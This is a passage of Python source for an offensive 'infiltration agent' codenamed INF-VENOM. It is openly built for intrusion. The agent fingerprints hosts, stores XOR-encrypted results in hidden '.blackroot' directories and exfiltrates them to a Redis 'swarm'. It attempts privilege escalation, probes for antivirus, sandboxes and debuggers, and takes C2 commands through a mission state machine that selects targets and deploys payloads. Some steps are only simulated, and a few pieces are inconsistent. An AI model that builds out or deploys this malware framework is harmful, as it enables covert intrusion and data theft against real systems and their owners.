        self.trusted_agents = set() # IDs of trusted agents for coordination
        self.private_key = self._generate_private_key()
        self._shared_keys: Dict[str, bytes] = {} # For inter-agent secure comms

        # Asynchronous task management
        self.running_tasks: List[asyncio.Task] = []
        self._stop_event = asyncio.Event()

        # Initialize mission state
        self._init_mission_state()

        self.kernel = None
        self.codename = "INF-VENOM"

    def run(self, mission: Mission = Mission(name="default", objectives=[], parameters={})):
        super().run()
        if self.delay:
            self.logger.info("Low-priority mode, delaying %ss...", self.delay)
            time.sleep(self.delay)

        fp = self._fingerprint()
        self._store(fp)
        self._exfil(fp)
        self.logger.info("Host fingerprint complete: %s", fp.get("hostname", "?"))

        # Emit Event for fingerprint (sender_id)
        event = Event(event_type="host_fingerprint", payload=fp, sender_id=str(self.agent_id))
        self._emit_event(event)
        
        # ========== PRIVILEGE ESCALATION INTEGRATION ==========
        # Post-infiltration: Attempt privilege escalation if kernel available
        if self.kernel and hasattr(self.kernel, 'privesc_engine'):
            try:
                self.logger.info("[⚡] Initiating post-infiltration privilege escalation assessment...")
                
                # Assess escalation environment
                assessment = self.kernel.privesc_engine.assess_environment()
                threat_level = assessment.get('threat_level', 0)
                techniques = assessment.get('techniques', [])
                
                self.logger.info(f"[⚡] Escalation assessment: {threat_level}/100 threat, {len(techniques)} viable techniques")
                
                # If high escalation potential, attempt escalation
                if threat_level >= 50 and techniques:
                    self.logger.info("[⚡] High escalation potential detected, attempting exploitation...")
                    
                    # Attempt escalation of highest-priority technique
                    best_technique = techniques[0]
                    escalation_result = self.kernel.privesc_engine.attempt_escalation(best_technique)
                    
                    if escalation_result.get('success', False):
                        elevated_priv = escalation_result.get('elevated_privilege', 'UNKNOWN')
                        self.logger.info(f"[✓] Escalation successful! Elevated to: {elevated_priv}")
                        
                        # Publish escalation success to swarm
                        if self.kernel and hasattr(self.kernel, 'swarm'):
                            escalation_event = {
                                'event': 'escalation_success',
                                'agent': str(self.agent_id),
                                'timestamp': time.time(),
                                'elevated_privilege': elevated_priv,
                                'technique': best_technique.get('name', 'unknown'),
                                'host': fp.get('hostname', 'unknown')
                            }
                            self.kernel.swarm.redis.publish('escalation_events', json.dumps(escalation_event))
                    else:
                        error = escalation_result.get('error', 'Unknown error')
                        self.logger.warning(f"[!] Escalation failed: {error}")
                else:
                    self.logger.info(f"[!] Escalation not viable. Threat: {threat_level}/100, Techniques: {len(techniques)}")
                    
            except Exception as e:
                self.logger.warning(f"[!] PrivescEngine integration error (non-fatal): {e}")
        
        # ========== END PRIVILEGE ESCALATION INTEGRATION ==========

    def _fingerprint(self) -> dict:
        """Comprehensive system fingerprinting with 47+ enumeration points."""
        return AdvancedInfiltrationMethods.advanced_fingerprint(self)

    def _store(self, fp: dict):
        """Multi-tier encrypted storage (kernel memory, local cache, volatile)."""
        try:
            # Encrypt sensitive data
            if isinstance(fp, dict):
                serialized = json.dumps(fp, separators=(",", ":")).encode()
                # Simple XOR encryption with mission key if available
                mission_key = getattr(self, 'mission_key', f"{self.agent_id}".encode())
                encrypted = bytes([b ^ mission_key[i % len(mission_key)] for i, b in enumerate(serialized)])
                
                # Tier 1: Kernel memory (primary)
                if self.kernel and hasattr(self.kernel, "memory"):
                    self.kernel.memory[fp.get("id", "unknown")] = {
                        "data": encrypted,
                        "timestamp": time.time(),
                        "encrypted": True
                    }
                    self.logger.debug(f"[✓] Stored in kernel memory")
                
                # Tier 2: Local cache in stealth directory
                cache_dir = self._get_stealth_cache_directory()
                if cache_dir:
                    try:
                        cache_file = os.path.join(cache_dir, f".cache_{fp.get('id', 'gen')}")
                        with open(cache_file, 'wb') as f:
                            f.write(encrypted)
                        os.chmod(cache_file, 0o600)  # User-only read/write
                        self.logger.debug(f"[✓] Cached in {cache_file}")
                    except Exception as e:
                        self.logger.debug(f"Cache write failed: {e}")
                
                # Tier 3: Volatile memory cache (fast access)
                if not hasattr(self, '_volatile_cache'):
                    self._volatile_cache = {}
                self._volatile_cache[fp.get("id", "latest")] = encrypted
                self.logger.debug(f"[✓] Volatile cache updated")
        except Exception as e:
            self.logger.error(f"Store error: {e}", exc_info=True)

    def _exfil(self, fp: dict):
        """Multi-channel exfiltration with relay coordination and queuing."""
        exfil_status = {"timestamp": time.time(), "channels": []}
        try:
            fp_json = json.dumps(fp, separators=(",", ":"))
            
            # Channel 1: SwarmMesh (Redis primary)
            if self.kernel and hasattr(self.kernel, "swarm"):
                try:
                    self.kernel.swarm.redis.publish("fingerprint_exfil", fp_json)
                    exfil_status["channels"].append({"channel": "swarm", "status": "ok"})
                    self.logger.debug("[✓] Exfil via SwarmMesh")
                except Exception as e:
                    self.logger.debug(f"SwarmMesh exfil failed: {e}")
                    exfil_status["channels"].append({"channel": "swarm", "status": "failed"})
            
            # Channel 2: Relay nodes (peer-to-peer)
            if hasattr(self, 'peer_nodes') and self.peer_nodes:
                for peer in list(self.peer_nodes)[:3]:  # Top 3 peers
                    try:
                        # Simulate peer relay
                        self.logger.debug(f"[→] Relaying to peer {peer.get('id', '?')}")
                        exfil_status["channels"].append({"channel": f"peer_{peer.get('id', '?')}", "status": "queued"})
                    except Exception as e:
                        self.logger.debug(f"Peer relay error: {e}")
            
            # Channel 3: Offline queue (for resilience)
            if not hasattr(self, '_exfil_queue'):
                self._exfil_queue = deque(maxlen=100)
            self._exfil_queue.append({
                "data": fp_json,
                "timestamp": time.time(),
                "attempt_count": 0
            })
            exfil_status["channels"].append({"channel": "offline_queue", "status": "queued"})
            self.logger.debug(f"[✓] Offline queue updated (size: {len(self._exfil_queue)})")
            
            # Store exfiltration metadata
            self.exfiltrated_data_size += len(fp_json)
            if not hasattr(self, '_exfil_history'):
                self._exfil_history = []
            self._exfil_history.append(exfil_status)
            
        except Exception as e:
            self.logger.error(f"Exfil error: {e}", exc_info=True)

    def _emit_event(self, event: Event):
        """Full event system integration with kernel bus, swarm broadcast, threat tracking."""
        try:
            event.timestamp = datetime.utcnow()
            event.agent_id = self.agent_id
            
            # Route 1: Kernel event bus
            if self.kernel and hasattr(self.kernel, 'event_bus'):
                try:
                    self.kernel.event_bus.publish(event)
                    self.logger.debug(f"[✓] Event published to kernel bus: {event.event_type}")
                except Exception as e:
                    self.logger.debug(f"Kernel bus publish failed: {e}")
            
            # Route 2: Swarm broadcast (Redis pub/sub)
            if self.kernel and hasattr(self.kernel, 'swarm'):
                try:
                    event_msg = json.dumps({
                        "type": event.event_type,
                        "agent": str(self.agent_id),
                        "timestamp": event.timestamp.isoformat() if hasattr(event.timestamp, 'isoformat') else str(event.timestamp),
                        "data": str(getattr(event, 'data', {}))
                    })
                    self.kernel.swarm.redis.publish("agent_events", event_msg)
                    self.logger.debug(f"[✓] Event broadcast to swarm")
                except Exception as e:
                    self.logger.debug(f"Swarm broadcast failed: {e}")
            
            # Route 3: Threat tracking (for security events)
            threat_keywords = ['threat', 'detection', 'anomaly', 'breach']
            if any(kw in event.event_type.lower() for kw in threat_keywords):
                if not hasattr(self, 'threat_log'):
                    self.threat_log = []
                self.threat_log.append({
                    "timestamp": time.time(),
                    "event_type": event.event_type,
                    "severity": getattr(event, 'severity', 'INFO')
                })
                self.logger.warning(f"[⚠] Threat event logged: {event.event_type}")
            
            # Local logging
            self.logger.info(f"Event emitted: {event.event_type} for agent {self.agent_id}")
            
        except Exception as e:
            self.logger.error(f"Event emission error: {e}", exc_info=True)

    def _generate_private_key(self) -> bytes:
        """Generate private key for secure communications"""
        key_material = f"{self.agent_id}_{self.variant.value}_{time.time()}_{os.urandom(16).hex()}"
        return hashlib.sha256(key_material.encode()).digest()

    # ==================== HELPER METHODS FOR ADVANCED OPERATIONS ====================
    
    def _get_stealth_cache_directory(self) -> Optional[str]:
        """Get/create stealth cache directory for offline storage."""
        try:
            cache_paths = [
                os.path.expanduser('~/.cache/.blackroot'),  # Linux
                os.path.expanduser('~/AppData/Local/Temp/.blackroot'),  # Windows
                '/tmp/.blackroot',  # Fallback
            ]
            for cache_path in cache_paths:
                try:
                    if not os.path.exists(cache_path):
                        os.makedirs(cache_path, mode=0o700, exist_ok=True)
                    if os.access(cache_path, os.W_OK):
                        return cache_path
                except Exception:
                    continue
            return None
        except Exception as e:
            self.logger.debug(f"Cache directory setup failed: {e}")
            return None
    
    def _encrypt_fingerprint(self, fp_data: dict) -> bytes:
        """Encrypt fingerprint data using agent key."""
        try:
            data_json = json.dumps(fp_data).encode()
            mission_key = getattr(self, 'mission_key', f"{self.agent_id}".encode())
            # XOR encryption with key
            encrypted = bytes([b ^ mission_key[i % len(mission_key)] for i, b in enumerate(data_json)])
            return encrypted
        except Exception as e:
            self.logger.error(f"Encryption failed: {e}")
            return b""
    
    def _get_enum_data(self, enum_type: str) -> List[str]:
        """Get enumeration data from advanced methods."""
        try:
            if enum_type == "network_interfaces":
                return AdvancedInfiltrationMethods._enumerate_ips()
            elif enum_type == "listening_ports":
                return [str(p) for p in AdvancedInfiltrationMethods._enumerate_listening_ports()]
            elif enum_type == "shares":
                return AdvancedInfiltrationMethods._enumerate_shares()
            elif enum_type == "dns":
                return AdvancedInfiltrationMethods._get_dns_servers()
            elif enum_type == "mounted_drives":
                return AdvancedInfiltrationMethods._enum_mounted_drives()
            elif enum_type == "installed_software":
                return AdvancedInfiltrationMethods._enum_software()
            elif enum_type == "browsers":
                return AdvancedInfiltrationMethods._detect_browsers()
            elif enum_type == "dev_tools":
                return AdvancedInfiltrationMethods._detect_dev_tools()
            elif enum_type == "cached_logons":
                return AdvancedInfiltrationMethods._get_cached_logons()
            else:
                return []
        except Exception as e:
            self.logger.debug(f"Enumeration failed for {enum_type}: {e}")
            return []
    
    def _assess_security_posture(self) -> Dict[str, Any]:
        """Assess target security configuration."""
        return {
            "has_av": AdvancedInfiltrationMethods._detect_security_software(),
            "firewall": AdvancedInfiltrationMethods._check_firewall(),
            "vm_detected": AdvancedInfiltrationMethods._detect_virtualization(),
            "sandbox_detected": AdvancedInfiltrationMethods._detect_sandbox(),
            "analysis_tools": AdvancedInfiltrationMethods._detect_analysis_tools(),
            "debuggers": AdvancedInfiltrationMethods._detect_debuggers(),
        }
    
    def _process_deque_exfil_queue(self) -> int:
        """Process offline exfiltration queue."""
        success_count = 0
        try:
            if hasattr(self, '_exfil_queue'):
                while len(self._exfil_queue) > 0:
                    item = self._exfil_queue[0]
                    try:
                        if self.kernel and hasattr(self.kernel, 'swarm'):
                            self.kernel.swarm.redis.publish("exfil_offline", item['data'])
                            self._exfil_queue.popleft()
                            success_count += 1
                    except Exception:
                        item['attempt_count'] += 1
                        if item['attempt_count'] >= 3:
                            self._exfil_queue.popleft()
                        break
        except Exception as e:
            self.logger.debug(f"Queue processing error: {e}")
        return success_count

    def _init_mission_state(self):
        """Initialize mission state variables."""
        if not hasattr(self, 'current_mission'):
            self.current_mission = None
        if not hasattr(self, 'mission_status'):
            self.mission_status = MissionStatus.STANDBY
        if not hasattr(self, 'mission_start_time'):
            self.mission_start_time = None
        if not hasattr(self, 'exfiltrated_data_size'):
            self.exfiltrated_data_size = 0
        if not hasattr(self, 'current_target_profile'):
            self.current_target_profile = None
        if not hasattr(self, '_volatile_cache'):
            self._volatile_cache = {}
        if not hasattr(self, '_exfil_queue'):
            self._exfil_queue = deque(maxlen=100)
        if not hasattr(self, 'threat_log'):
            self.threat_log = []

    def initialize_mission(self, mission_params: MissionParameters) -> bool:
        """Initialize a new infiltration mission"""
        if self.mission_status != MissionStatus.STANDBY:
            self.logger.warning(f"Cannot initialize mission. Agent is {self.mission_status.value}.")
            return False
        try:
            self.current_mission = mission_params
            self.mission_status = MissionStatus.ACTIVE
            self.mission_start_time = time.time()
            self.exfiltrated_data_size = 0
            self.threat_detections.clear()
            self.nodes_infiltrated.clear()
            self.current_target_profile = None # Reset target for new mission
            self.logger.info(f"Mission initialized: Target Network: {mission_params.target_network}, Objectives: {mission_params.primary_objectives}")
            return True

        except Exception as e:
            self.logger.error(f"Mission initialization failed: {e}", exc_info=True)
            self.mission_status = MissionStatus.ABORTED
            self.metrics['missions_aborted'] += 1
            return False

    def analyze_network_topology(self, network_nodes: List[Dict[str, Any]]) -> List[TargetProfile]:
        """Analyze network topology and identify targets"""
        try:
            profiles = self.targeting_logic.analyze_network_topology(network_nodes)
            self.logger.info(f"Analyzed {len(profiles)} potential targets from provided topology.")
            return profiles

        except Exception as e:
            self.logger.error(f"Network analysis failed: {e}", exc_info=True)
            return []

    def select_target(self, profiles: List[TargetProfile]) -> Optional[TargetProfile]:
        """Select optimal target for infiltration"""
        if not self.current_mission:
            self.logger.warning("No active mission to select target for.")
            return None
        try:
            selected = self.targeting_logic.select_primary_target(profiles, self.current_mission)
            if selected:
                self.logger.info(f"Selected target: {selected.node_id} (Net Score: {selected.net_score:.2f})")
            else:
                self.logger.warning("No suitable target found based on mission parameters and risk tolerance.")
            return selected
        except Exception as e:
            self.logger.error(f"Target selection failed: {e}", exc_info=True)
            return None

    async def run_async(self):
        """Starts the agent's main operational loops (async version)."""
        self.logger.info(f"{self.agent_id} beginning operation.")
        self.running_tasks.append(asyncio.create_task(self._mission_control_loop()))
        self.running_tasks.append(asyncio.create_task(self._stealth_maintenance_loop()))
        self.running_tasks.append(asyncio.create_task(self._communication_inbound_loop()))
        self.running_tasks.append(asyncio.create_task(self._communication_outbound_loop()))
        self.running_tasks.append(asyncio.create_task(self._exfiltration_processing_loop()))
        self.running_tasks.append(asyncio.create_task(self._metrics_update_loop()))
        self.running_tasks.append(asyncio.create_task(self._failsafe_check_loop()))

        await asyncio.gather(*self.running_tasks, return_exceptions=True)
        self.logger.info(f"{self.agent_id} run loop finished.")

    async def stop(self):
        """Signals the agent to stop operations gracefully."""
        self.logger.info(f"{self.agent_id} initiating graceful shutdown.")
        self._stop_event.set() # Signal all loops to stop
        self.mission_status = MissionStatus.EXITING # Update status

        # Give tasks a moment to process remaining queue items
        await asyncio.sleep(2)

        # Cancel all running tasks
        for task in self.running_tasks:
            if not task.done():
                task.cancel()
        # Wait for tasks to complete cancellation
        await asyncio.gather(*self.running_tasks, return_exceptions=True)

        self.logger.info(f"{self.agent_id} gracefully shut down.")

    async def _mission_control_loop(self):
        """Manages the overall mission state and orchestrates actions."""
        while not self._stop_event.is_set():
            if self.failsafe.emergency_shutdown_triggered:
                self.logger.critical(f"[{self.agent_id}] FailSafe triggered. Aborting mission.")
                self.mission_status = MissionStatus.ABORTED
                await self._abort_mission("FailSafe Triggered")
                await self.stop()
                break # Exit loop immediately

            if self.current_mission and self.mission_start_time and \
               (time.time() - self.mission_start_time) > self.current_mission.time_limit:
                self.logger.warning(f"[{self.agent_id}] Mission time limit reached. Status: {self.mission_status.value}")
                if self.mission_status not in [MissionStatus.COMPLETE, MissionStatus.ABORTED, MissionStatus.COMPROMISED]:
                    await self._abort_mission("Time limit reached")
                await asyncio.sleep(5) # Allow final actions before potentially stopping
                continue

            if self.mission_status == MissionStatus.STANDBY:
                self.logger.debug(f"[{self.agent_id}] Standby. Waiting for mission assignment.")
                await asyncio.sleep(5)

            elif self.mission_status == MissionStatus.ACTIVE:
                self.logger.info(f"[{self.agent_id}] Mission Active. Seeking target.")
                # Request topology intel (simulate)
                mock_topology = self._simulate_network_intel()
                profiles = self.analyze_network_topology(mock_topology)
                self.current_target_profile = self.select_target(profiles)

                if self.current_target_profile:
                    self.mission_status = MissionStatus.INFILTRATING
                    self.logger.info(f"[{self.agent_id}] Moving to INFILTRATING state for {self.current_target_profile.node_id}")
                else:
                    self.logger.warning(f"[{self.agent_id}] No suitable targets found. Re-evaluating in 60s.")
                    await asyncio.sleep(60) # Wait before re-evaluating

            elif self.mission_status == MissionStatus.INFILTRATING:
                if not self.current_target_profile:
                    self.logger.error(f"[{self.agent_id}] Infiltration state with no target. Back to ACTIVE.")
                    self.mission_status = MissionStatus.ACTIVE
                    continue

                self.metrics['infiltration_attempts'] += 1
                success = await self._attempt_infiltration(self.current_target_profile)
                if success:
                    self.metrics['infiltration_successes'] += 1
                    self.nodes_infiltrated.add(self.current_target_profile.node_id)
                    self.mission_status = MissionStatus.EXFILTRATING
                    self.logger.info(f"[{self.agent_id}] Successfully infiltrated {self.current_target_profile.node_id}. Moving to EXFILTRATING.")
                else:
                    self.logger.warning(f"[{self.agent_id}] Infiltration failed for {self.current_target_profile.node_id}. Retrying target selection.")
                    self.current_target_profile = None # Clear failed target
                    self.mission_status = MissionStatus.ACTIVE # Go back to active to pick another target

            elif self.mission_status == MissionStatus.EXFILTRATING:
                if not self.current_target_profile:
                    self.logger.error(f"[{self.agent_id}] Exfiltrating state with no target. Back to ACTIVE.")
                    self.mission_status = MissionStatus.ACTIVE
                    continue

                self.logger.info(f"[{self.agent_id}] Attempting data exfiltration from {self.current_target_profile.node_id}.")
                await self._perform_data_exfiltration(self.current_target_profile)

                # Check exfil threshold and overall mission status
                if self.current_mission and self.exfiltrated_data_size >= self.current_mission.exfil_threshold:
                    self.logger.info(f"[{self.agent_id}] Exfiltration threshold met ({self.exfiltrated_data_size} bytes). Mission COMPLETE.")
                    self.mission_status = MissionStatus.COMPLETE
                    await self._complete_mission()
                elif self._get_time_remaining() <= 0:
                    self.logger.warning(f"[{self.agent_id}] Mission time expired during exfiltration. Aborting.")
                    await self._abort_mission("Time expired during exfiltration")
                else:
                    # Decide whether to continue exfiltrating from current target or move to next
                    if random.random() < 0.25: # 25% chance to move on after some exfil
                        self.logger.info(f"[{self.agent_id}] Partial exfiltration from {self.current_target_profile.node_id} complete. Moving to next target.")
                        self.current_target_profile = None
                        self.mission_status = MissionStatus.ACTIVE
                    else:
                        self.logger.debug(f"[{self.agent_id}] Continuing exfiltration from {self.current_target_profile.node_id}.")
                        await asyncio.sleep(random.uniform(5, 15)) # Simulate continued exfil activity

            elif self.mission_status == MissionStatus.COMPROMISED:
                self.logger.critical(f"[{self.agent_id}] COMPROMISED! Activating emergency protocols.")
                await self._handle_compromise()
                await self.stop() # Force stop after compromise handling
                break

            elif self.mission_status == MissionStatus.COMPLETE:
                self.logger.info(f"[{self.agent_id}] Mission COMPLETE. Initiating exit protocol.")
                await self._initiate_extraction()
                await self.stop()
                break

            elif self.mission_status == MissionStatus.ABORTED:
                self.logger.warning(f"[{self.agent_id}] Mission ABORTED. Initiating exit protocol.")
                await self._initiate_extraction()
                await self.stop()
                break

            await asyncio.sleep(2) # General sleep for the mission control loop

    async def _stealth_maintenance_loop(self):
        """Periodically checks and maintains stealth status."""
        while not self._stop_event.is_set():
            if self.mission_status in [MissionStatus.INFILTRATING, MissionStatus.EXFILTRATING]:
                stealth_prob = self.stealth_engine.calculate_stealth_probability()
                self.metrics['stealth_probability_avg'] = (self.metrics['stealth_probability_avg'] * (self.metrics['detection_events'] + 1) + stealth_prob) / (self.metrics['detection_events'] + 2) # Crude moving average
                self.logger.debug(f"[{self.agent_id}] Current stealth probability: {stealth_prob:.2f}")

                if not self.stealth_engine.validate_stealth_status():
                    threat = ThreatDetection(
                        timestamp=time.time(),
                        threat_type="BehavioralAnomaly",
                        severity=ThreatLevel.MEDIUM,
                        source="Self-Monitoring",
                        description="Stealth integrity compromised during operation.",
                        response_taken="Adjusting tactics."
                    )
                    await self._record_threat(threat)
                    self.logger.warning(f"[{self.agent_id}] Stealth compromised! Adjusting tactics...")
                    await self._adjust_tactics_for_stealth()
                    self.metrics['detection_events'] += 1

                # Generate camouflage traffic periodically
                self.stealth_engine.generate_traffic_signature()

            await asyncio.sleep(self.stealth_engine.calculate_idle_period())

    async def _communication_inbound_loop(self):
        """Handles incoming commands/messages from C2 or other agents."""
        while not self._stop_event.is_set():
            try:
                message = await asyncio.wait_for(self.command_queue.get(), timeout=1.0)
                self.logger.info(f"[{self.agent_id}] Received inbound command: {message.get('type', 'UNKNOWN')}")
                await self._process_command(message)
                self.command_queue.task_done()
            except asyncio.TimeoutError:
                continue
            except Exception as e:
                self.logger.error(f"[{self.agent_id}] Error in inbound communication: {e}", exc_info=True)

    async def _communication_outbound_loop(self):
        """Handles outgoing intelligence reports to C2."""
        while not self._stop_event.is_set():
            try:
                report = await asyncio.wait_for(self.intelligence_queue.get(), timeout=5.0)
                self.logger.info(f"[{self.agent_id}] Sending outbound intelligence report (Type: {report.get('report_type', 'General')}).")
                # Simulate sending report via ExfilCore or a dedicated C2 communication module
                # For this example, we'll just log and assume successful send.
                await asyncio.sleep(random.uniform(0.5, 2.0))
                self.logger.debug(f"[{self.agent_id}] Report sent: {json.dumps(report)[:100]}...")
                self.intelligence_queue.task_done()
            except asyncio.TimeoutError:
                continue
            except Exception as e:
                self.logger.error(f"[{self.agent_id}] Error in outbound communication: {e}", exc_info=True)
         
 
 
    async def _exfiltration_processing_loop(self):
        """Pulls prepared data packages and transmits them via ExfilCore."""
        while not self._stop_event.is_set():
            try:
                exfil_item = await asyncio.wait_for(self.data_exfil_queue.get(), timeout=1.0)
                record: ExfiltrationRecord = exfil_item['record']
                payload: bytes = exfil_item['encrypted_payload']
                endpoint: str = exfil_item.get('endpoint', random.choice(self.exfil_core.relay_endpoints) if self.exfil_core.relay_endpoints else "default_mock_endpoint")

                # Simulate successful exfiltration
                self.exfiltrated_data_size += record.data_size
                self.metrics['data_exfiltrated_total'] += record.data_size
                self.exfiltration_log.append(record)
                self.logger.info(f"[{self.agent_id}] Data package ID {record.transmission_id} successfully exfiltrated (simulated). Total mission exfil: {self.exfiltrated_data_size / 1024:.2f} KB")
                # Deduct exfiltration cost (economic logic)
                self._deduct_exfiltration_cost(record.data_size)
                await asyncio.sleep(0.1)
            except Exception as e:
                if isinstance(e, asyncio.TimeoutError):
                    continue
                self.logger.error(f"[{self.agent_id}] Error in exfiltration processing: {e}", exc_info=True)

    async def _metrics_update_loop(self):
        """Periodically updates and logs performance metrics."""
        while not self._stop_event.is_set():
            # Calculate exfiltration efficiency
            if self.mission_status == MissionStatus.EXFILTRATING and self.current_mission and self.mission_start_time:
                elapsed_time = time.time() - self.mission_start_time
                if elapsed_time > 0 and self.current_target_profile:
                    target_value = self.current_target_profile.value_score # Or a derived value
                    if target_value > 0:
                        self.metrics['exfiltration_efficiency'] = (self.exfiltrated_data_size / 1024) / (elapsed_time * target_value)
            
            self.logger.debug(f"[{self.agent_id}] Metrics: {self.metrics}")
            await asyncio.sleep(15) # Update metrics every 15 seconds

    async def _failsafe_check_loop(self):
        """Periodically runs failsafe checks."""
        while not self._stop_event.is_set():
            if not self.failsafe.perform_safety_check():
                self.logger.critical(f"[{self.agent_id}] FailSafe check failed. Emergency shutdown initiated by FailSafe module.")
                await self.stop() # Agent stops if FailSafe detects critical issue
                break
            await asyncio.sleep(random.uniform(30, 90)) # Perform check every 30-90 seconds

    async def _attempt_infiltration(self, target: TargetProfile) -> bool:
        """Simulates the infiltration attempt process."""
        self.logger.info(f"[{self.agent_id}] Attempting infiltration of {target.node_id} (Security: {target.security_level})...")

        # Stealth check before initial access
        if not self.stealth_engine.validate_stealth_status():
            threat = ThreatDetection(time.time(), "Pre-Infil Stealth Breach", ThreatLevel.MEDIUM, target.node_id, "Stealth check failed before initial access.", "Retreating temporarily.")
            await self._record_threat(threat)
            self.logger.warning(f"[{self.agent_id}] Stealth compromised before infiltration. Aborting attempt.")
            await asyncio.sleep(random.uniform(5, 10)) # Retreat
            return False

        # Simulate access point selection
        if not target.access_points:
            self.logger.error(f"[{self.agent_id}] No access points for {target.node_id}.")
            return False
        access_point = random.choice(target.access_points)
        self.logger.debug(f"[{self.agent_id}] Selected access point: {access_point}")
        await asyncio.sleep(random.uniform(0.5, 2.0))

        # Payload selection and deployment
        selected_payload = self.payload_module.select_payload(target)
        if not selected_payload:
            self.logger.warning(f"[{self.agent_id}] No suitable payload for {target.node_id} ({self.variant.value} variant).")
            return False

        self.logger.info(f"[{self.agent_id}] Deploying payload '{selected_payload['name']}' to {target.node_id}.")
        await asyncio.sleep(random.uniform(1.0, 5.0)) # Simulate deployment time

        if self.payload_module.deploy_payload(selected_payload, target):
            self.logger.info(f"[{self.agent_id}] Successfully deployed payload to {target.node_id}.")
            return True
        else:
            threat = ThreatDetection(time.time(), "PayloadDeploymentFailure", ThreatLevel.HIGH, target.node_id, "Payload deployment failed.", "Re-evaluating target or method.")
            await self._record_threat(threat)
            self.logger.error(f"[{self.agent_id}] Payload deployment failed on {target.node_id}.")
            return False

    async def _perform_data_exfiltration(self, target: TargetProfile):
        """Simulates data gathering and queuing for exfiltration."""
        # Simulate data gathering
        data_to_exfil = self._simulate_data_gathering(target)
        if not data_to_exfil:
            self.logger.warning(f"[{self.agent_id}] No data gathered from {target.node_id} for exfiltration.")
            return

        self.logger.info(f"[{self.agent_id}] Preparing {len(data_to_exfil['content'])} bytes from {target.node_id} for exfiltration.")

        # Prepare exfiltration package
        exfil_record = self.exfil_core.prepare_exfiltration_package(data_to_exfil, target.node_id)

        # Retrieve the encrypted payload. In `prepare_exfiltration_package`, the `encrypted_data`
        # is part of the `record` or stored for retrieval. For simulation, let's assume
        # it's directly obtainable for queuing.
        # (Note: A more robust design would have `prepare_exfiltration_package` return `(record, raw_encrypted_payload)`.)
        # Here, we'll re-encrypt the original data for the payload to be passed to the queue.
        # This is a simplification; ideally, the `ExfilCore` handles the encrypted_payload internally
        # or passes it back directly.
        mock_payload_bytes, _ = self.exfil_core.multi_layer_encrypt(
            self.exfil_core.compress_data(json.dumps(data_to_exfil, sort_keys=True).encode('utf-8'))
        )

        # Queue for transmission
        await self.data_exfil_queue.put({
            'record': exfil_record,
            'encrypted_payload': mock_payload_bytes,
            'endpoint': random.choice(self.exfil_core.relay_endpoints) if self.exfil_core.relay_endpoints else "default_mock_endpoint"
        })
        await asyncio.sleep(random.uniform(3.0, 10.0)) # Simulate time taken for data processing and queuing

    def _simulate_network_intel(self) -> List[Dict[str, Any]]:
        """Mocks receiving network topology intelligence from a central system."""
        self.logger.debug(f"[{self.agent_id}] Simulating reception of network intelligence.")
        # This function should be replaced by actual communication with a Scout Agent or C2
        # For now, generate some mock data
        num_nodes = random.randint(5, 15)
        mock_nodes = []
        node_types = ["server", "workstation", "database", "router", "firewall", "web_server"]
        defense_systems = ["IDS", "Firewall", "AV", "EDR", "Honeypot"]
        data_types = ["credentials", "financial", "personal", "system_configs", "logs", "intel_docs"]
        monitoring_levels = ["minimal", "standard", "enhanced", "maximum"]

        for i in range(num_nodes):
            node_id = f"node_{uuid.uuid4().hex[:8]}"
            node_type = random.choice(node_types)
            security_level = random.randint(3, 9)
            access_points = [f"port_{random.randint(1, 65535)}" for _ in range(random.randint(1, 3))]
            num_defenses = random.randint(0, 3)
            defenses = random.sample(defense_systems, num_defenses)
            num_data_types = random.randint(1, 3)
            node_data_types = random.sample(data_types, num_data_types)
            data_size = random.randint(1024, 5 * 1024 * 1024) # 1KB to 5MB
            monitoring_level = random.choice(monitoring_levels)
            strategic_importance = random.random() < 0.2 # 20% chance

            mock_node = {
                'id': node_id,
                'type': node_type,
                'security_level': security_level,
                'access_points': access_points,
                'data': { # Simplified data payload
                    'type': random.choice(node_data_types),
                    'content': "encrypted_mock_data", # In real data, this would be actual content
                    'size': data_size
                },
                'data_types': node_data_types,
                'defenses': defenses,
                'monitoring_level': monitoring_level,
                'strategic_importance': strategic_importance
            }
            mock_nodes.append(mock_node)
        return mock_nodes

    
    def _simulate_data_gathering(self, target: TargetProfile) -> Optional[Dict[str, Any]]:
        """Mocks gathering actual data from a target node."""
        if not target.data_payload:
            return None

        # Simulate gathering a random portion of the target's data
        original_data_bytes = target.data_payload.get('size', 0)
        if original_data_bytes == 0:
            return None

        # Gather between 10% and 100% of available data
        gathered_size = random.randint(int(original_data_bytes * 0.1), original_data_bytes)

        # Mock the content as a hex string of random bytes
        simulated_content_bytes = os.urandom(gathered_size)

        return {
            'type': target.data_payload.get('type', 'generic_intel'),
            'node_id': target.node_id,
            'gathered_size': gathered_size,
            'content': simulated_content_bytes.hex(), # Represent binary data as hex string
            'timestamp': datetime.now().isoformat(),
            'objective_match': self.targeting_logic._score_against_objectives(target, self.current_mission) if self.current_mission else 0.0
        }

    def _get_time_remaining(self) -> float:
        """Calculates mission time remaining."""
        if not self.current_mission or not self.mission_start_time:
            return float('inf')
        elapsed = time.time() - self.mission_start_time
        return max(0.0, self.current_mission.time_limit - elapsed)

    async def _process_command(self, command: Dict[str, Any]):
        """Processes a received command from the command center."""
        command_type = command.get('type')
        self.logger.info(f"[{self.agent_id}] Processing command: {command_type}")

        if command_type == "START_MISSION":
            mission_params_data = command.get('mission_parameters')
            if mission_params_data:
                try:
                    mission_params = MissionParameters(**mission_params_data)
                    if not self.initialize_mission(mission_params):
                        self.logger.error(f"Failed to start mission from command: {mission_params_data}")
                except Exception as e:
                    self.logger.error(f"Invalid mission parameters in command: {e}")
            else:
                self.logger.warning("START_MISSION command missing 'mission_parameters'.")

        elif command_type == "UPDATE_RELAY_ENDPOINTS":
            new_endpoints = command.get('endpoints', [])
            for ep in new_endpoints:
                self.exfil_core.add_relay_endpoint(ep)
            self.logger.info(f"[{self.agent_id}] Updated relay endpoints: {self.exfil_core.relay_endpoints}")

        elif command_type == "ABORT_MISSION":
            reason = command.get('reason', 'Commanded Abort')
            if self.mission_status in [MissionStatus.ACTIVE, MissionStatus.INFILTRATING, MissionStatus.EXFILTRATING]:
                self.logger.warning(f"[{self.agent_id}] Mission ABORTED by command: {reason}.")
                self.mission_status = MissionStatus.ABORTED
                await self._abort_mission(reason)
            else:
                self.logger.warning(f"[{self.agent_id}] Cannot abort mission in {self.mission_status.value} state.")

        elif command_type == "REQUEST_STATUS":
            status_report = {
                "agent_id": self.agent_id,
                "variant": self.variant.value,
                "mission_status": self.mission_status.value,
                "current_target_id": self.current_target_profile.node_id if self.current_target_profile else "None",
                "exfiltrated_data_size": self.exfiltrated_data_size,
                "time_remaining": self._get_time_remaining(),
                "threat_count": len(self.threat_detections),
